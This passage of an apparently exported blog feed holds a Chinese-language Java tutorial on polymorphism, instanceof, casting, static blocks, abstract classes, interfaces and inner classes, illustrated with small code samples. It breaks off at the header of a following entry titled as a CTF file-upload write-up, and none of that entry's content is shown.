<span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//对象的实际类型是确定的</span></span><br><span class="line">        <span class="comment">//new Student()</span></span><br><span class="line">        <span class="comment">//new Person()</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//可以指向引用类型就不确定了: 父类的引用指向子类</span></span><br><span class="line">        <span class="comment">//Student 能调用的方法都是自己的或者继承父类的</span></span><br><span class="line">        Student s1 = <span class="keyword">new</span> Student();</span><br><span class="line">        <span class="comment">//父类型可以指向子类，但是不能调用子类独有的方法</span></span><br><span class="line">        Person  s2 = <span class="keyword">new</span> Student();</span><br><span class="line">        Object s3 = <span class="keyword">new</span> Student();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//对象能执行那些方法，主要看对象左边的类型，和右边关系不大</span></span><br><span class="line">        s2.run();</span><br><span class="line">        s1.run();</span><br><span class="line">        ((Student)s2).eat();</span><br><span class="line">        s1.eat();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="instanceof"><a href="#instanceof" class="headerlink" title="instanceof"></a>instanceof</h4><p> 判断两个类之间是否存在继承关系</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> oop;</span><br><span class="line"><span class="keyword">import</span> oop.demo05.Person;</span><br><span class="line"><span class="keyword">import</span> oop.demo05.Student;</span><br><span class="line"><span class="keyword">import</span> oop.demo05.Teacher;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Object object = <span class="keyword">new</span> Student();</span><br><span class="line"></span><br><span class="line">        System.out.println(object <span class="keyword">instanceof</span> Student); <span class="comment">//true</span></span><br><span class="line">        System.out.println(object <span class="keyword">instanceof</span> Person);  <span class="comment">//true</span></span><br><span class="line">        System.out.println(object <span class="keyword">instanceof</span> Object);  <span class="comment">//true</span></span><br><span class="line">        System.out.println(object <span class="keyword">instanceof</span> Teacher); <span class="comment">//false</span></span><br><span class="line">        System.out.println(object <span class="keyword">instanceof</span> String);  <span class="comment">//false</span></span><br><span class="line">        System.out.println(<span class="string">&quot;=======================&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Person person = <span class="keyword">new</span> Student();</span><br><span class="line">        System.out.println(person <span class="keyword">instanceof</span> Student); <span class="comment">//true</span></span><br><span class="line">        System.out.println(person <span class="keyword">instanceof</span> Person); <span class="comment">//true</span></span><br><span class="line">        System.out.println(person <span class="keyword">instanceof</span> Object);  <span class="comment">// true</span></span><br><span class="line">        System.out.println(person <span class="keyword">instanceof</span> Teacher); <span class="comment">//false</span></span><br><span class="line">        <span class="comment">//System.out.println(person instanceof String); 编译报错</span></span><br><span class="line">        System.out.println(<span class="string">&quot;=======================&quot;</span>);</span><br><span class="line">        Student student = <span class="keyword">new</span> Student();</span><br><span class="line">        System.out.println(student <span class="keyword">instanceof</span> Student); <span class="comment">//true</span></span><br><span class="line">        System.out.println(student <span class="keyword">instanceof</span> Person);  <span class="comment">//true</span></span><br><span class="line">        System.out.println(student <span class="keyword">instanceof</span> Object); <span class="comment">//true</span></span><br><span class="line">        <span class="comment">//System.out.println(student instanceof Teacher); 编译报错</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> oop;</span><br><span class="line"><span class="keyword">import</span> oop.demo05.Person;</span><br><span class="line"><span class="keyword">import</span> oop.demo05.Student;</span><br><span class="line"><span class="keyword">import</span> oop.demo05.Teacher;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//类型之间的转化: 父   子</span></span><br><span class="line">        Person obj = <span class="keyword">new</span> Student();</span><br><span class="line">        <span class="comment">// 高             低</span></span><br><span class="line">        <span class="comment">// student 将这个对象转换成Student 类型，我们就可以使用Student类型的方法了</span></span><br><span class="line">        ((Student) obj).go();</span><br><span class="line"></span><br><span class="line">        Student student = <span class="keyword">new</span> Student();</span><br><span class="line">        student.go();</span><br><span class="line">        <span class="comment">// 子类转换成父类，可能丢失一些自己的方法</span></span><br><span class="line">        Person person = student;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        1. 父类引用指向子类</span></span><br><span class="line"><span class="comment">        2. 把子类转化为父类,向上转换</span></span><br><span class="line"><span class="comment">        3. 把父类转换子类，向下转型: 强制转换</span></span><br><span class="line"><span class="comment">        4. 方便方法的调用，减少重复的代码!</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="static-关键字详解"><a href="#static-关键字详解" class="headerlink" title="static 关键字详解"></a>static 关键字详解</h3><p>常见的调用静态方法 和静态变量</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> oop.demo06;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span>  <span class="keyword">static</span> <span class="keyword">int</span> age; <span class="comment">//静态变量</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">double</span> score;  <span class="comment">//非静态变量</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        Student s1 = <span class="keyword">new</span> Student();</span><br><span class="line">        System.out.println(Student.age);</span><br><span class="line">        System.out.println(s1.age);</span><br><span class="line">        System.out.println(s1.score);</span><br><span class="line">        </span><br><span class="line">        go();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">go</span><span class="params">()</span></span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;</span><br><span class="line">        go();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>静态代码块</p><p>执行顺序 静态代码块(且执行一次)&gt;匿名代码块(可以用来赋初值)&gt;构造方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> oop.demo06;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="comment">//2:赋初值</span></span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;匿名代码块&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//1:只执行一次</span></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;静态代码块&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//3 构造方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;构造方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        Person person1 =<span class="keyword">new</span> Person();</span><br><span class="line">        System.out.println(<span class="string">&quot;==============&quot;</span>);</span><br><span class="line">        Person person2 = <span class="keyword">new</span> Person();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>静态导入包</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> oop.demo06;</span><br><span class="line"><span class="comment">//静态导入包</span></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> java.lang.Math.random;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> java.lang.Math.PI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.out.println(random());</span><br><span class="line">        System.out.println(PI);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h3><p>abstract修饰符可以用来修饰方法也可以修饰类，如果修饰方法那么该方法是抽象方法，如果修饰类，那么该类就是抽象类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> oop.demo07;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span>  <span class="class"><span class="keyword">class</span> <span class="title">Action</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//仅仅是个约束</span></span><br><span class="line">    <span class="comment">//abstract ,抽象方法,只有方法名字,没有方法的实现</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span>  <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">doSomething</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Action</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//1.不能new这个抽象类,只能靠子类去实现它</span></span><br><span class="line">    <span class="comment">//2.抽象类中可以写普通的方法~</span></span><br><span class="line">    <span class="comment">//3.抽象方法必须在抽象类中~</span></span><br><span class="line">    <span class="comment">//4.抽象类不能被实例化,但是可以存在构造函数</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hahahah&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p> 本质还是写约束规范(传怎样的参数，返回什么样的值)，简化开发流程</p><h3 id="接口的定义与实现"><a href="#接口的定义与实现" class="headerlink" title="接口的定义与实现"></a>接口的定义与实现</h3><p><strong>接口就是规范，定义的一组规则，实现了 约束和实现分离：面向接口编程~</strong></p><p>OO的精髓，是对对象的抽象，最能体现这一点的就是接口。设计模式只针对具备了抽象能力的语言（如c++，java，C#），这是因为设计模式所研究的，就是合理的抽象</p><p><strong>声明类的关键字是class，声明接口的关键字是interface</strong></p><p>接口实现了伪多继承</p><ul><li>约束</li><li>定义一些方法，让不同的人实现 </li><li>public abstract </li><li>public static final</li><li>接口不能实例化,接口没有构造方法</li><li>implements可以实现多个接口</li><li>需要重写接口中的方法</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> oop.demo08;</span><br><span class="line"></span><br><span class="line"><span class="comment">//java 抽象的思想</span></span><br><span class="line"><span class="comment">//interface 定义的关键字</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">UserService</span> </span>&#123;</span><br><span class="line">    <span class="comment">//接口中的所有定义都是抽象的 public abstract</span></span><br><span class="line">    <span class="comment">//常量~ public static final</span></span><br><span class="line">    <span class="keyword">int</span> AGE = <span class="number">99</span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(String name)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">(String name)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">update</span><span class="params">(String name)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">select</span><span class="params">(String name)</span></span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> oop.demo08;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">TimeService</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">timer</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> oop.demo08;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 抽象类: extends</span></span><br><span class="line"><span class="comment">// 类 可以实现接口 implements 接口</span></span><br><span class="line"><span class="comment">//实现了接口中的类,就需要重写接口的方法</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//利用接口可以实现多继承</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserServiceImpl</span>  <span class="keyword">implements</span> <span class="title">UserService</span>,<span class="title">TimeService</span></span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">timer</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">delete</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">update</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">select</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="N种内部类"><a href="#N种内部类" class="headerlink" title="N种内部类"></a>N种内部类</h3><p>内部类就是在一个类的内部定义一个类，比如，A类中定义一个B类，那么B类相对A类来说就称之为内部类，而A类相对B类来说就是外部类了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> oop.demo09;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Outer</span> </span>&#123;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//一个java类可以有多个class类，但只有一个public class 类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;方便做测试&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="成员内部类"><a href="#成员内部类" class="headerlink" title="成员内部类"></a>成员内部类</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> oop.demo09;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Outer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span>  <span class="keyword">int</span> id;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">out</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;这是外部类的方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Inner</span></span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span>  <span class="keyword">void</span> <span class="title">in</span><span class="params">()</span></span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;这是内部类的方法&quot;</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获得外部类的私有属性和私有方法</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getID</span><span class="params">()</span></span>&#123;</span><br><span class="line">            System.out.println(id);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> oop;</span><br><span class="line"><span class="keyword">import</span> oop.demo09.Outer;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Outer outer = <span class="keyword">new</span> Outer();</span><br><span class="line">        <span class="comment">//通过这个外部类的来实例化内部类</span></span><br><span class="line">        Outer.Inner inner = outer.<span class="function">new <span class="title">Inner</span><span class="params">()</span></span>;</span><br><span class="line">        inner.getID();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="静态内部类"><a href="#静态内部类" class="headerlink" title="静态内部类"></a>静态内部类</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> oop.demo09;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Outer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span>  <span class="keyword">int</span> id;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">out</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;这是外部类的方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Inner</span></span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span>  <span class="keyword">void</span> <span class="title">in</span><span class="params">()</span></span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;这是内部类的方法&quot;</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="局部内部类"><a href="#局部内部类" class="headerlink" title="局部内部类"></a>局部内部类</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> oop.demo09;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Outer</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//局部内部类</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span>  <span class="keyword">void</span> <span class="title">method</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="class"><span class="keyword">class</span> <span class="title">Inner</span></span>&#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">in</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="匿名局部类"><a href="#匿名局部类" class="headerlink" title="匿名局部类"></a>匿名局部类</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> oop.demo09;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//没有名字初始化类,不用讲实例保存到变量中~</span></span><br><span class="line">        <span class="keyword">new</span> Apple().eat();</span><br><span class="line">        <span class="keyword">new</span> UserService()&#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">hello</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Apple</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span>  <span class="title">UserService</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">hello</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> java学习之路 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GXYCTF2019-babyUpload</title>
      <link href="2021/04/10/GXYCTF2019-babyUpload/"/>
      <url>2021/04/10/GXYCTF2019-babyUpload/</url>
      
